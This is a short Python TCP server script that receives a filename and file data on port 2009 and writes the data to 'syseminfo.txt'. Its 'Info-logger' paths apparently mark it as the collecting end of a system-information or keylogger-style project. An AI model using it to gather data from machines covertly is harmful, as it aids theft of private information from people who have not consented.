import socket

system_information = "syseminfo.txt"
system_information_e = "e_systeminfo.txt"

file_path =  "C:\\Info-logger\\Logged_information" 
extend = "\\"
file_merge = file_path + extend

IP = socket.gethostbyname(socket.gethostname())
PORT = 2009
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"
def main():
    print("[STARTING] Server is starting.")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    server.listen()
    print("[LISTENING] Server is listening.")
    while True:
        conn, addr = server.accept()
        print(f"[NEW CONNECTION] {addr} connected.")
        filename = conn.recv(SIZE).decode(FORMAT)
        print(f"[RECV] Receiving the filename.")
        file = open(system_information, "w")
        conn.send("Filename received.".encode(FORMAT))
        data = conn.recv(SIZE).decode(FORMAT)
        print(f"[RECV] Receiving the file data.")
        file.write(data)
        conn.send("File data received".encode(FORMAT))
        file.close()
        conn.close()
        print(f"[DISCONNECTED] {addr} disconnected.")
        
main()